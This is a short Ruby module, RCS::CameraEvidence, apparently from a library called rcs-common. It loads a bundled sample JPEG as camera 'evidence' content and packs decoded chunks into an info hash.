require 'rcs-common/evidence/common'

module RCS

module CameraEvidence
  
  def content
    path = File.join(File.dirname(__FILE__), 'content', 'camera', '001.jpg')
    File.open(path, 'rb') {|f| f.read }
  end
  
  def generate_content
    [ content ]
  end
  
  def decode_content(common_info, chunks)
    info = Hash[common_info]
    info[:data] = Hash.new
    info[:grid_content] = chunks.first
    yield info
  end
end

end # ::RCS